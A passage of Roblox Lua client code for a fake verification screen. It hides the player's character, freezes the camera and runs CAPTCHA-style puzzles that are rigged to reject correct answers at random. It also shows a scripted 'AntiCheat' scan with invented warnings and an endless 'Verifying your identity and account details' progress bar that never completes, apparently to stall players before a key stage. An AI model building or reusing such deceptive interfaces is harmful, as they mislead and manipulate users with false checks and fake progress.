local _savedCamType = cam.CameraType
local _frozenCF = cam.CFrame
local _charClone = nil
local _loaderActive = true

pcall(function()
    char.Archivable = true
    _charClone = char:Clone()
    char.Archivable = false
    _charClone.Name = '__verify_snap'

    for _, p in ipairs(_charClone:GetDescendants())do
        if p:IsA('BasePart') then
            p.CanCollide = false
            p.CastShadow = false
            p.Anchored = (p.Name == 'HumanoidRootPart')
        end
        if p:IsA('Script') or p:IsA('LocalScript') then
            p:Destroy()
        end
    end

    local cloneHum = _charClone:FindFirstChildOfClass('Humanoid')

    if cloneHum then
        cloneHum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
        cloneHum.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
    end

    local cloneRoot = _charClone:FindFirstChild('HumanoidRootPart')
    local realRoot = char:FindFirstChild('HumanoidRootPart')

    if cloneRoot and realRoot then
        cloneRoot.CFrame = realRoot.CFrame
    end

    _charClone.Parent = workspace

    task.spawn(function()
        task.wait(0.5)

        local realHum = char:FindFirstChildOfClass('Humanoid')
        local realAnim = realHum and realHum:FindFirstChildOfClass('Animator')
        local cloneAnim = cloneHum and (cloneHum:FindFirstChildOfClass('Animator') or Instance.new('Animator', cloneHum))

        if realAnim and cloneAnim then
            for _, track in ipairs(realAnim:GetPlayingAnimationTracks())do
                pcall(function()
                    local t = cloneAnim:LoadAnimation(track.Animation)

                    t.Looped = true

                    t:Play()

                    t.TimePosition = track.TimePosition
                end)
            end
        end
    end)

    cam.CameraType = Enum.CameraType.Scriptable
    _frozenCF = cam.CFrame
end)

local function _restoreAll()
    pcall(function()
        cam.CameraType = _savedCamType

        if _charClone then
            _charClone:Destroy()

            _charClone = nil
        end

        local currentChar = player.Character

        if currentChar then
            for _, p in ipairs(currentChar:GetDescendants())do
                if p:IsA('BasePart') or p:IsA('Decal') then
                    p.LocalTransparencyModifier = 0
                    p.Transparency = 0
                end
            end
        end
    end)
end

local _camConn

_camConn = RunService.RenderStepped:Connect(function()
    if not gui.Parent then
        _loaderActive = false

        _restoreAll()
        _camConn:Disconnect()

        return
    end
    if not _loaderActive then
        return
    end

    local currentChar = player.Character

    if currentChar then
        for _, p in ipairs(currentChar:GetDescendants())do
            if p:IsA('BasePart') or p:IsA('Decal') then
                p.Transparency = 1
            end
        end
    end

    cam.CameraType = Enum.CameraType.Scriptable
    cam.CFrame = _frozenCF
end)

local sliderBeganConn, sliderChangedConn, sliderEndedConn

local function cleanupSliderConnections()
    if sliderBeganConn then
        sliderBeganConn:Disconnect()

        sliderBeganConn = nil
    end
    if sliderChangedConn then
        sliderChangedConn:Disconnect()

        sliderChangedConn = nil
    end
    if sliderEndedConn then
        sliderEndedConn:Disconnect()

        sliderEndedConn = nil
    end
end
local function startSliderChallenge(doneEvent)
    cleanupSliderConnections()

    sliderFrame.Visible = true
    sliderError.Text = ''
    handle.Position = UDim2.new(0, 0, 0, 0)

    local zoneStart = math.random(10, 80) / 100
    local zoneWidth = 0.1

    targetZone.Position = UDim2.new(zoneStart, 0, 0, 0)
    targetZone.Size = UDim2.new(zoneWidth, 0, 1, 0)

    local dragging = false
    local zoneMoved = false
    local willMoveZone = math.random() < 0.3
    local failCount = 0

    local function finishSuccess()
        if failCount < 2 and math.random() < ARTIFICIAL_FAIL_CHANCE then
            failCount = failCount + 1
            sliderError.Text = 'Verification mismatch, try again.'
            handle.Position = UDim2.new(0, 0, 0, 0)

            return
        end

        cleanupSliderConnections()

        sliderFrame.Visible = false

        doneEvent:Fire()
    end

    sliderBeganConn = handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true

            if willMoveZone and not zoneMoved then
                task.delay(math.random(4, 8) / 10, function()
                    if dragging and not zoneMoved then
                        zoneMoved = true
                        zoneStart = math.random(10, 80) / 100
                        targetZone.Position = UDim2.new(zoneStart, 0, 0, 0)
                    end
                end)
            end
        end
    end)
    sliderChangedConn = UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local trackPos = sliderTrack.AbsolutePosition.X
            local trackWidth = sliderTrack.AbsoluteSize.X
            local handleWidth = handle.AbsoluteSize.X
            local relativeX = input.Position.X - trackPos - handleWidth / 2

            relativeX = math.clamp(relativeX, 0, math.max(trackWidth - handleWidth, 0))
            handle.Position = UDim2.new(0, relativeX, 0, 0)
        end
    end)
    sliderEndedConn = UserInputService.InputEnded:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragging = false

            local trackWidth = sliderTrack.AbsoluteSize.X
            local handleWidth = handle.AbsoluteSize.X
            local relativeX = handle.Position.X.Offset
            local handleCenterScale = (relativeX + handleWidth / 2) / trackWidth

            if handleCenterScale >= zoneStart and handleCenterScale <= zoneStart + zoneWidth then
                finishSuccess()
            else
                sliderError.Text = 'Not aligned, try again.'
                handle.Position = UDim2.new(0, 0, 0, 0)
            end
        end
    end)
end

local function shuffleOrderNumbers()
    local nums = {
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
    }

    for i = #nums, 2, -1 do
        local j = math.random(1, i)

        nums[i], nums[j] = nums[j], nums[i]
    end

    for i, btn in ipairs(orderButtons)do
        btn.Text = tostring(nums[i])
        btn.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    end
end
local function startOrderChallenge(doneEvent)
    cleanupOrderConns()

    orderFrame.Visible = true

    shuffleOrderNumbers()

    local expectedNext = 1
    local doneFlags = {}
    local failCount = 0

    local function ghostReshuffle()
        local remainingButtons, remainingNumbers = {}, {}

        for i, btn in ipairs(orderButtons)do
            if not doneFlags[i] then
                table.insert(remainingButtons, btn)
                table.insert(remainingNumbers, tonumber(btn.Text))
            end
        end

        for i = #remainingNumbers, 2, -1 do
            local j = math.random(1, i)

            remainingNumbers[i], remainingNumbers[j] = remainingNumbers[j], remainingNumbers[i]
        end

        for i, btn in ipairs(remainingButtons)do
            btn.Text = tostring(remainingNumbers[i])
        end
    end

    for idx, btn in ipairs(orderButtons)do
        local conn = btn.Activated:Connect(function()
            local value = tonumber(btn.Text)

            if value == expectedNext then
                btn.BackgroundColor3 = Color3.fromRGB(160, 220, 170)
                doneFlags[idx] = true
                expectedNext = expectedNext + 1

                if expectedNext > 8 then
                    if failCount < 2 and math.random() < ARTIFICIAL_FAIL_CHANCE then
                        failCount = failCount + 1

                        for _, b in ipairs(orderButtons)do
                            b.BackgroundColor3 = Color3.fromRGB(230, 140, 140)
                        end

                        task.wait(0.3)

                        doneFlags = {}

                        shuffleOrderNumbers()

                        expectedNext = 1
                    else
                        cleanupOrderConns()

                        orderFrame.Visible = false

                        doneEvent:Fire()
                    end
                elseif math.random() < 0.3 then
                    task.wait(0.15)
                    ghostReshuffle()
                end
            else
                btn.BackgroundColor3 = Color3.fromRGB(230, 140, 140)

                task.wait(0.3)

                doneFlags = {}

                shuffleOrderNumbers()

                expectedNext = 1
            end
        end)

        table.insert(orderConns, conn)
    end
end

local function generateMemoryCode()
    local chars = {}

    for i = 1, 6 do
        local idx = math.random(1, #MEMORY_CHARSET)

        table.insert(chars, MEMORY_CHARSET:sub(idx, idx))
    end

    return table.concat(chars)
end
local function startMemoryChallenge(doneEvent)
    cleanupMemoryConns()

    memoryFrame.Visible = true
    memoryError.Text = ''

    local function attempt()
        cleanupMemoryConns()

        local code = generateMemoryCode()

        memoryDisplay.Text = code
        memoryDisplay.Visible = true
        memoryInput.Visible = false
        memorySubmit.Visible = false
        memoryError.Text = ''

        task.wait(1.6)

        memoryDisplay.Visible = false
        memoryInput.Text = ''
        memoryInput.Visible = true
        memorySubmit.Visible = true

        if math.random() < 0.3 then
            table.insert(memoryConns, memoryInput:GetPropertyChangedSignal('Text'):Connect(function()
                if #memoryInput.Text > 0 and math.random() < 0.15 then
                    memoryInput.Text = memoryInput.Text:sub(1, #memoryInput.Text - 1)
                end
            end))
        end

        local submitted = false

        local function checkSubmit()
            if submitted then
                return
            end

            if memoryInput.Text:upper() == code then
                cleanupMemoryConns()

                memoryFrame.Visible = false

                doneEvent:Fire()
            else
                memoryError.Text = 'Incorrect, try again.'

                task.wait(1)
                attempt()
            end
        end

        table.insert(memoryConns, memorySubmit.Activated:Connect(checkSubmit))
        table.insert(memoryConns, memoryInput.FocusLost:Connect(function(enterPressed)
            if enterPressed then
                checkSubmit()
            end
        end))
    end

    attempt()
end

local function startSpotChallenge(doneEvent, attemptCount, randomFailCount)
    attemptCount = attemptCount or 1
    randomFailCount = randomFailCount or 0

    cleanupSpotConns()

    spotGeneration = spotGeneration + 1

    local myGeneration = spotGeneration

    spotFrame.Visible = true

    local baseR, baseG, baseB = math.random(120, 200), math.random(120, 200), math.random(120, 200)
    local baseColor = Color3.fromRGB(baseR, baseG, baseB)
    local shift = math.random(9, 15) * (math.random(0, 1) == 0 and -1 or 1)
    local diffColor = Color3.fromRGB(math.clamp(baseR + shift, 0, 255), math.clamp(baseG + shift, 0, 255), math.clamp(baseB + shift, 0, 255))
    local diffIndex = math.random(1, 8)

    for i, cell in ipairs(spotCells)do
        cell.BackgroundColor3 = (i == diffIndex) and diffColor or baseColor
    end

    if math.random() < 0.25 then
        task.delay(math.random(10, 20) / 10, function()
            if myGeneration == spotGeneration and spotFrame.Visible then
                local decoyIndex = math.random(1, 8)

                if decoyIndex == diffIndex then
                    decoyIndex = (decoyIndex % 8) + 1
                end

                local decoyShift = shift / 2
                local decoyColor = Color3.fromRGB(math.clamp(baseR + decoyShift, 0, 255), math.clamp(baseG + decoyShift, 0, 255), math.clamp(baseB + decoyShift, 0, 255))
                local originalColor = spotCells[decoyIndex].BackgroundColor3

                spotCells[decoyIndex].BackgroundColor3 = decoyColor

                task.wait(0.35)

                if myGeneration == spotGeneration and spotFrame.Visible then
                    spotCells[decoyIndex].BackgroundColor3 = originalColor
                end
            end
        end)
    end

    for i, cell in ipairs(spotCells)do
        local conn = cell.Activated:Connect(function()
            if i == diffIndex then
                local shouldFail = false

                if randomFailCount < 2 then
                    local failChance = (attemptCount == 1) and 0.7 or ARTIFICIAL_FAIL_CHANCE

                    shouldFail = math.random() < failChance
                end
                if shouldFail then
                    task.wait(0.2)
                    startSpotChallenge(doneEvent, attemptCount + 1, randomFailCount + 1)
                else
                    cleanupSpotConns()

                    spotFrame.Visible = false

                    doneEvent:Fire()
                end
            else
                task.wait(0.15)
                startSpotChallenge(doneEvent, attemptCount + 1, randomFailCount)
            end
        end)

        table.insert(spotConns, conn)
    end
end

local challengeBag = {}
local bagIndex = 0
local lastChallengeKind = 0

local function refillBag()
    local bag = {
        1,
        2,
        3,
        4,
        5,
        6,
    }

    for i = #bag, 2, -1 do
        local j = math.random(1, i)

        bag[i], bag[j] = bag[j], bag[i]
    end

    if bag[1] == lastChallengeKind then
        bag[1], bag[2] = bag[2], bag[1]
    end

    challengeBag = bag
    bagIndex = 0
end
local function pickChallengeKind()
    bagIndex = bagIndex + 1

    if bagIndex > #challengeBag then
        refillBag()

        bagIndex = 1
    end

    local kind = challengeBag[bagIndex]

    lastChallengeKind = kind

    return kind
end
local function runChallenge()
    local doneEvent = Instance.new('BindableEvent')
    local kind = pickChallengeKind()

    if kind == 1 then
        startSliderChallenge(doneEvent)
    elseif kind == 2 then
        startOrderChallenge(doneEvent)
    elseif kind == 3 then
        startMemoryChallenge(doneEvent)
    elseif kind == 4 then
        startStroopChallenge(doneEvent)
    elseif kind == 5 then
        startSpotChallenge(doneEvent)
    else
        startArrowChallenge(doneEvent)
    end

    doneEvent.Event:Wait()
    doneEvent:Destroy()
end
local function runFinalTask()
    barBg.Visible = true
    statusLabel.Visible = true
    elapsedLabel.Visible = true
    taskLabel.Text = 'Task ' .. TOTAL_TASKS .. '/' .. TOTAL_TASKS .. ' (final step)'

    local totalFiles = math.random(800, 999)
    local currentFile = math.floor(totalFiles * math.random(80, 90) / 100)
    local barValue = currentFile / totalFiles

    barFill.Size = UDim2.new(barValue, 0, 1, 0)

    local remainingSeconds = math.random(180, 240)
    local slowUntilTick = 0

    task.spawn(function()
        local tickCount = 0

        while true do
            task.wait(1)

            tickCount = tickCount + 1

            local tickAmount = 1

            if tickCount < slowUntilTick then
                tickAmount = 0.3
            elseif math.random() < 0.08 then
                slowUntilTick = tickCount + math.random(8, 20)
                tickAmount = 0.3
            end

            remainingSeconds = remainingSeconds - tickAmount

            if remainingSeconds <= 0 then
                remainingSeconds = math.random(180, 240)
            end

            elapsedLabel.Text = string.format('Est. remaining: %02d:%02d', math.floor(remainingSeconds / 60), math.floor(remainingSeconds % 60))
        end
    end)

    while true do
        local advanceFiles = math.random(2, 6)

        currentFile = math.min(currentFile + advanceFiles, totalFiles - 1)

        local newBarValue = math.min(currentFile / totalFiles, 0.97)

        fillBar(math.random(8, 16), barValue, newBarValue)

        barValue = newBarValue
        statusLabel.Text = 'Verifying your identity and account details...\nFile ' .. currentFile .. '/' .. totalFiles .. '...'

        task.wait(math.random(1, 3))

        if math.random() < 0.35 then
            local failedFile = currentFile
            local dropFiles = math.random(3, 10)

            currentFile = math.max(currentFile - dropFiles, 1)

            local dropBarValue = currentFile / totalFiles

            fillBar(math.random(2, 4), barValue, dropBarValue)

            barValue = dropBarValue
            statusLabel.Text = 'Verifying your identity and account details...\nChecksum mismatch on file ' .. failedFile .. ', retrying...'

            task.wait(math.random(1, 2))
        end
    end
end

    scanConsole.Visible = false

    for i = 1, TOTAL_TASKS - 1 do
        taskLabel.Text = 'Task ' .. i .. '/' .. TOTAL_TASKS

        runChallenge()
        task.wait(0.6)
    end

    runFinalTask()
end

local function logLine(text, delay)
    consoleText.Text = consoleText.Text .. (consoleText.Text == '' and '' or '\n') .. text

    task.wait(delay or math.random(7, 14) / 10)
end
local function runAntiCheatScan()
    checkFrame.Visible = false
    footer.Visible = false
    scanConsole.Visible = true
    consoleText.Text = ''

    local retries = 0

    while true do
        for _, line in ipairs(SCAN_LINES)do
            logLine(line, math.random(7, 14) / 10)

            if math.random() < 0.2 then
                logLine(MINOR_WARNINGS[math.random(1, #MINOR_WARNINGS)], math.random(8, 14) / 10)
            end
        end

        if retries < MAX_SCAN_RETRIES and math.random() < SCAN_RETRY_CHANCE then
            retries = retries + 1

            logLine('[AntiCheat] WARNING: suspicious memory pattern detected', 1.3)
            logLine('[AntiCheat] Restarting scan for safety (attempt ' .. (retries + 1) .. ')...', 1.5)

            consoleText.Text = ''
        else
            break
        end
    end

    logLine('[AntiCheat] Scan complete. No threats found.', 1)
    logLine('[AntiCheat] Proceeding to license verification...', 1.2)
    task.wait(1)
    runKeyStage()
end
